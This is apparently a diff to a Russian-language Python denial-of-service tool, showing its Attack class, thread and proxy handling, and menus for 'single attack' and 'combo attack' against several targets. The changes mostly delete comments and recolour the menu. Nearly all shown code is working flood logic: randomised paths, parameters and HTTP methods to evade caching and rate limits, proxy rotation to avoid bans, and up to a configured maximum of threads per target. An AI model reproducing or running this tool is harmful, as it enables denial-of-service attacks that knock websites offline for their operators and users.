@@ -88,7 +88,6 @@ def random_params():
         'rand': random.randint(10000, 99999),
         'timestamp': str(int(time.time() * 1000) + random.randint(-10000, 10000)),
     }
-    # Добавляем случайные параметры
     for _ in range(random.randint(1, 5)):
         key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 8)))
         value = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz123456789', k=random.randint(5, 15)))
@@ -188,7 +187,7 @@ def bar(p, w=20):
     f = int(w * p / 100)
     return f"[{G7 + '█' * f + E + '░' * (w - f)}] {p}%"
 
-# ================= БАННЕР =================
+# ================= БАННЕР (УБРАЛ TARISTE) =================
 def banner():
     clear()
     print(f"""
@@ -230,7 +229,6 @@ class Attack:
         self.proxy_index = 0
         self.proxy_lock = threading.Lock()
         
-        # Создаём пул сессий
         self.session = requests.Session()
         adapter = requests.adapters.HTTPAdapter(
             pool_connections=200,
@@ -240,7 +238,6 @@ class Attack:
         self.session.mount('http://', adapter)
         self.session.mount('https://', adapter)
         
-        # Для многопоточности
         self.executor = ThreadPoolExecutor(max_workers=MAX_THREADS)
         self.futures = []
 
@@ -259,13 +256,11 @@ class Attack:
             params = random_params()
             path_url = random_path(url)
             
-            # Добавляем случайный фрагмент
             if random.random() > 0.5:
                 path_url += f'#{random.randint(1000, 9999)}'
             
             start_time = time.time()
             
-            # Используем разные методы
             method = random.choice(['GET', 'POST', 'HEAD'])
             
             if method == 'GET':
@@ -287,7 +282,7 @@ class Attack:
                     proxies=proxy,
                     timeout=TIMEOUT
                 )
-            else:  # HEAD
+            else:
                 response = self.session.head(
                     path_url,
                     params=params,
@@ -304,12 +299,10 @@ class Attack:
                 
                 if response.status_code in [200, 201, 202, 204, 301, 302, 303, 304, 307, 308, 404]:
                     self.ok += 1
-                    # Небольшая задержка для успешных запросов
                     time.sleep(random.uniform(0.001, 0.005))
                 elif response.status_code in [403, 429, 503, 401, 402, 405, 406, 407, 408, 410, 413, 414, 415, 416, 417]:
                     self.ban += 1
                     self.err += 1
-                    # Большая задержка при бане
                     time.sleep(random.uniform(0.05, 0.1))
                 else:
                     self.err += 1
@@ -339,7 +332,6 @@ class Attack:
                 except:
                     pass
         
-        # Создаём потоки
         for _ in range(threads):
             t = threading.Thread(target=worker, daemon=True)
             t.start()
@@ -347,7 +339,6 @@ class Attack:
         while self.running:
             time.sleep(0.05)
         
-        # Очистка
         for t in threading.enumerate():
             if t != threading.current_thread() and t.is_alive():
                 try:
@@ -429,7 +420,6 @@ def single_attack():
     
     threads = safe_int(f"{G6}Потоки (1-{MAX_THREADS}): {W}", 100, 1, MAX_THREADS)
     
-    # Загружаем прокси
     proxies = load_proxies()
     if not proxies:
         print(f"{Y}⚠ Прокси не найдены! Работа без прокси — ваш IP будет забанен{E}")
@@ -497,7 +487,6 @@ def combo_attack():
     
     threads_per_target = safe_int(f"{G6}Потоков на цель (1-{MAX_THREADS}): {W}", 50, 1, MAX_THREADS)
     
-    # Загружаем прокси
     proxies = load_proxies()
     if not proxies:
         print(f"{Y}⚠ Прокси не найдены! Работа без прокси — ваш IP будет забанен{E}")
@@ -565,16 +554,16 @@ def combo_attack():
     print(f"\n{G7}Нажми ENTER для возврата...{E}")
     input()
 
-# ================= МЕНЮ =================
+# ================= МЕНЮ (ВСЁ ЗЕЛЁНОЕ) =================
 def menu():
     clear()
     banner()
     print(f"""
 {G7}ГЛАВНОЕ МЕНЮ
 
-{R}1.{W} 💀 Одиночная атака (мощная)
-{R}2.{W} 💀 КОМБО-АТАКА (несколько целей)
-{G5}99.{W} Exit
+{G6}1.{G7} Одиночная атака (мощная)
+{G6}2.{G7} КОМБО-АТАКА (несколько целей)
+{G6}99.{G7} Exit
 {E}
 """)
 
